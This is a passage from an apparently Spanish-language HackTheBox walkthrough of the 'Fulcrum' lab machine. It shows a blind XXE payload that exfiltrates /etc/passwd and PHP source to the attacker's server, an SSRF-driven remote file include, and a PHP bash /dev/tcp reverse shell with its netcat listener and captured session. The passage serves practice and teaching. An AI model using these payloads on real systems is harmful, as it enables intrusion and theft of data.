<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/11.png" />
</p>

<ul>
  <li>Puede que sea a ciegas por que no nos reporta nada pero podemos probar si recibimos una petición a un servidor nuestro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora vemos que si funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/12.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:29:25] code 404, message File not found
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:29:25] <span class="s2">"GET /test HTTP/1.0"</span> 404 -
</code></pre></div></div>

<ul>
  <li>
    <p>Sabiendo esto podemos probar lo siguiente <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#blind-ssrf-exfiltrate-data-out-of-band">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#blind-ssrf-exfiltrate-data-out-of-band</a>.</p>
  </li>
  <li>
    <p>Necesitamos parámetros en este caso vamos a crear <code class="language-plaintext highlighter-rouge">%param1</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/13.png" />
</p>

<ul>
  <li>
    <p>Vamos a crear el <code class="language-plaintext highlighter-rouge">xml</code> <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#malicious-dtd-example">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#malicious-dtd-example</a>.</p>
  </li>
  <li>
    <p>Vamos a cargar en <code class="language-plaintext highlighter-rouge">base64</code> el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la maquina.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>zi.xml
&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/etc/passwd"</span><span class="o">&gt;</span>
&lt;<span class="o">!</span>ENTITY % param1 <span class="s2">"&lt;!ENTITY filename SYSTEM 'http://10.10.14.62/%file;'&gt;"</span><span class="o">&gt;</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/14.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:45:07] <span class="s2">"GET /zi.xml HTTP/1.0"</span> 200 -
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:45:07] code 404, message File not found
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:45:07] <span class="s2">"GET /cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg== HTTP/1.0"</span> 404 -
</code></pre></div></div>

<ul>
  <li>Funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
</span>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
libvirt-qemu:x:64055:108:Libvirt Qemu,,,:/var/lib/libvirt:/usr/sbin/nologin
libvirt-dnsmasq:x:114:120:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/usr/sbin/nologin
</code></pre></div></div>

<ul>
  <li>Podemos cargar el <code class="language-plaintext highlighter-rouge">index.php</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>zi.xml
&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/var/www/api/index.php"</span><span class="o">&gt;</span>
&lt;<span class="o">!</span>ENTITY % param1 <span class="s2">"&lt;!ENTITY filename SYSTEM 'http://10.10.14.62/%file;'&gt;"</span><span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>Si volvemos a enviar la petición la recibimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:53:50] <span class="s2">"GET /zi.xml HTTP/1.0"</span> 200 -
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:53:50] code 404, message File not found
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:53:50] <span class="s2">"GET /PD9waHAKCWhlYWRlcignQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD11dGYtOCcpOwoJaGVhZGVyKCdTZXJ2ZXI6IEZ1bGNydW0tQVBJIEJldGEnKTsKCWxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIgKGZhbHNlKTsKCSR4bWxmaWxlID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7CgkkZG9tID0gbmV3IERPTURvY3VtZW50KCk7CgkkZG9tLT5sb2FkWE1MKCR4bWxmaWxlLExJQlhNTF9OT0VOVHxMSUJYTUxfRFRETE9BRCk7CgkkaW5wdXQgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRvdXRwdXQgPSAkaW5wdXQtPlBpbmc7CgkvL2NoZWNrIGlmIG9rCglpZigkb3V0cHV0ID09ICJQaW5nIikKCXsKCQkkZGF0YSA9IGFycmF5KCdIZWFydGJlYXQnID0+IGFycmF5KCdQaW5nJyA9PiAiUGluZyIpKTsKCX1lbHNlewoJCSRkYXRhID0gYXJyYXkoJ0hlYXJ0YmVhdCcgPT4gYXJyYXkoJ1BpbmcnID0+ICJQb25nIikpOwoJfQoJZWNobyBqc29uX2VuY29kZSgkZGF0YSk7CgoKPz4KCgo= HTTP/1.0"</span> 404 -
</code></pre></div></div>

<ul>
  <li>Vemos el código y con esto entendemos por que se ocasiona el XXE.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"PD9waHAKCWhlYWRlcignQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD11dGYtOCcpOwoJaGVhZGVyKCdTZXJ2ZXI6IEZ1bGNydW0tQVBJIEJldGEnKTsKCWxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIgKGZhbHNlKTsKCSR4bWxmaWxlID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7CgkkZG9tID0gbmV3IERPTURvY3VtZW50KCk7CgkkZG9tLT5sb2FkWE1MKCR4bWxmaWxlLExJQlhNTF9OT0VOVHxMSUJYTUxfRFRETE9BRCk7CgkkaW5wdXQgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRvdXRwdXQgPSAkaW5wdXQtPlBpbmc7CgkvL2NoZWNrIGlmIG9rCglpZigkb3V0cHV0ID09ICJQaW5nIikKCXsKCQkkZGF0YSA9IGFycmF5KCdIZWFydGJlYXQnID0+IGFycmF5KCdQaW5nJyA9PiAiUGluZyIpKTsKCX1lbHNlewoJCSRkYXRhID0gYXJyYXkoJ0hlYXJ0YmVhdCcgPT4gYXJyYXkoJ1BpbmcnID0+ICJQb25nIikpOwoJfQoJZWNobyBqc29uX2VuY29kZSgkZGF0YSk7CgoKPz4KCgo="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo</span>
&lt;?php
	header<span class="o">(</span><span class="s1">'Content-Type:application/json;charset=utf-8'</span><span class="o">)</span><span class="p">;</span>
	header<span class="o">(</span><span class="s1">'Server: Fulcrum-API Beta'</span><span class="o">)</span><span class="p">;</span>
	libxml_disable_entity_loader <span class="o">(</span><span class="nb">false</span><span class="o">)</span><span class="p">;</span>
	<span class="nv">$xmlfile</span> <span class="o">=</span> file_get_contents<span class="o">(</span><span class="s1">'php://input'</span><span class="o">)</span><span class="p">;</span>
	<span class="nv">$dom</span> <span class="o">=</span> new DOMDocument<span class="o">()</span><span class="p">;</span>
	<span class="nv">$dom</span>-&gt;loadXML<span class="o">(</span><span class="nv">$xmlfile</span>,LIBXML_NOENT|LIBXML_DTDLOAD<span class="o">)</span><span class="p">;</span>
	<span class="nv">$input</span> <span class="o">=</span> simplexml_import_dom<span class="o">(</span><span class="nv">$dom</span><span class="o">)</span><span class="p">;</span>
	<span class="nv">$output</span> <span class="o">=</span> <span class="nv">$input</span>-&gt;Ping<span class="p">;</span>
	//check <span class="k">if </span>ok
	<span class="k">if</span><span class="o">(</span><span class="nv">$output</span> <span class="o">==</span> <span class="s2">"Ping"</span><span class="o">)</span>
	<span class="o">{</span>
		<span class="nv">$data</span> <span class="o">=</span> array<span class="o">(</span><span class="s1">'Heartbeat'</span> <span class="o">=&gt;</span> array<span class="o">(</span><span class="s1">'Ping'</span> <span class="o">=&gt;</span> <span class="s2">"Ping"</span><span class="o">))</span><span class="p">;</span>
	<span class="o">}</span><span class="k">else</span><span class="o">{</span>
		<span class="nv">$data</span> <span class="o">=</span> array<span class="o">(</span><span class="s1">'Heartbeat'</span> <span class="o">=&gt;</span> array<span class="o">(</span><span class="s1">'Ping'</span> <span class="o">=&gt;</span> <span class="s2">"Pong"</span><span class="o">))</span><span class="p">;</span>
	<span class="o">}</span>
	<span class="nb">echo </span>json_encode<span class="o">(</span><span class="nv">$data</span><span class="o">)</span><span class="p">;</span>


?&gt;
</code></pre></div></div>

<ul>
  <li>Si recordamos hay mas puertos abiertos como el puerto <code class="language-plaintext highlighter-rouge">4</code> y podemos ver el código por detrás.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>zi.xml
&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/var/www/uploads/index.php"</span><span class="o">&gt;</span>
&lt;<span class="o">!</span>ENTITY % param1 <span class="s2">"&lt;!ENTITY filename SYSTEM 'http://10.10.14.62/%file;'&gt;"</span><span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Al enviar la petición recibimos el <code class="language-plaintext highlighter-rouge">base64</code> y vemos el código.</p>
  </li>
  <li>
    <p>Y bueno si observamos ya se nos ocurre un <code class="language-plaintext highlighter-rouge">SSRF</code> por el <code class="language-plaintext highlighter-rouge">127.0.0.1</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"PD9waHAKaWYoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gIT0gIjEyNy4wLjAuMSIpCnsKCWVjaG8gIjxoMT5VbmRlciBNYWludGFuY2U8L2gxPjxwPlBsZWFzZSA8YSBocmVmPVwiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSAuICI6NC9pbmRleC5waHA/cGFnZT1ob21lXCI+dHJ5IGFnYWluPC9hPiBsYXRlci48L3A+IjsKfWVsc2V7CgkkaW5jID0gJF9SRVFVRVNUWyJwYWdlIl07CglpbmNsdWRlKCRpbmMuIi5waHAiKTsKfQo/PgoK"</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo</span>
&lt;?php
<span class="k">if</span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'REMOTE_ADDR'</span><span class="o">]</span> <span class="o">!=</span> <span class="s2">"127.0.0.1"</span><span class="o">)</span>
<span class="o">{</span>
	<span class="nb">echo</span> <span class="s2">"&lt;h1&gt;Under Maintance&lt;/h1&gt;&lt;p&gt;Please &lt;a href=</span><span class="se">\"</span><span class="s2">http://"</span> <span class="nb">.</span> <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'SERVER_ADDR'</span><span class="o">]</span> <span class="nb">.</span> <span class="s2">":4/index.php?page=home</span><span class="se">\"</span><span class="s2">&gt;try again&lt;/a&gt; later.&lt;/p&gt;"</span><span class="p">;</span>
<span class="o">}</span><span class="k">else</span><span class="o">{</span>
	<span class="nv">$inc</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="o">[</span><span class="s2">"page"</span><span class="o">]</span><span class="p">;</span>
	include<span class="o">(</span><span class="nv">$inc</span>.<span class="s2">".php"</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
?&gt;
</code></pre></div></div>

<ul>
  <li>Desde el XXE lo que podemos hacer es apuntar ala <code class="language-plaintext highlighter-rouge">127.0.0.1:24</code> y tratar de cargar un archivo nuestro de la siguiente forma.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/15.png" />
</p>

<ul>
  <li>Nos adjunta el <code class="language-plaintext highlighter-rouge">.php</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 14:13:54] code 404, message File not found
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 14:13:54] <span class="s2">"GET /yo.php HTTP/1.0"</span> 404 -
</code></pre></div></div>

<ul>
  <li>
    <p>La maquina tramita la petición contra si misma no un tercero por eso funciona.</p>
  </li>
  <li>
    <p>Con esto ya podemos enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
  </li>
  <li>
    <p>Podemos crear un archivo en <code class="language-plaintext highlighter-rouge">php</code> ya que la web lo interpreta y con eso podemos enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>yo.php
&lt;?php
	system<span class="o">(</span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.62/443 0&gt;&amp;1'"</span><span class="o">)</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora le damos a send y enviamos la data.</p>
  </li>
  <li>
    <p>Recibimos la petición.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.62] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.62] 47870
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1044<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@fulcrum:~/uploads<span class="nv">$ </span><span class="nb">whoami
whoami
</span>www-data
www-data@fulcrum:~/uploads<span class="err">$</span>
www-data@fulcrum:~/uploads<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
www-data@fulcrum:~/uploads<span class="nv">$ </span>^Z
<span class="o">[</span>1]  + 33751 suspended  nc <span class="nt">-nlvp</span> 443
➜  ~ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + 33751 continued  nc <span class="nt">-nlvp</span> 443
                                    reset xterm
ENTER
www-data@fulcrum:~/uploads<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<ul>
  <li>La máquina tiene otra interfaz.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/<span class="nv">$ </span><span class="nb">hostname</span> <span class="nt">-I</span>
